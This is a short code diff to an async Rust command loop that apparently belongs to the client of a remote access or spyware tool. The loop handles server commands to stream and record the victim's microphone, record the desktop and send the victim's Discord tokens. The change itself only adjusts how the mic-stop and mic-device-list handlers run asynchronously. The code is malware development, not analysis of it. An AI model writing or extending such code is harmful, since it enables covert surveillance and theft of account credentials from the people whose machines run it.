@@ -142,8 +142,10 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::StartMicLive(device_id))) => start_mic_live(device_id),
             Ok(Some(ClientboundPacket::StopMicLive)) => stop_mic_live(),
             Ok(Some(ClientboundPacket::StartMicRecording(device_id))) => start_mic_recording(device_id),
-            Ok(Some(ClientboundPacket::StopMicRecording)) => stop_mic_recording(),
-            Ok(Some(ClientboundPacket::RequestMicDevices)) => send_mic_device_list(),
+            Ok(Some(ClientboundPacket::StopMicRecording)) => stop_mic_recording().await,
+            Ok(Some(ClientboundPacket::RequestMicDevices)) => {
+                tokio::spawn(send_mic_device_list());
+            }
             Ok(Some(ClientboundPacket::RequestDiscordTokens)) => send_discord_tokens(),
             Ok(Some(ClientboundPacket::StartDesktopRecording(config))) => start_desktop_recording(config),
             Ok(Some(ClientboundPacket::StopDesktopRecording)) => stop_desktop_recording(),
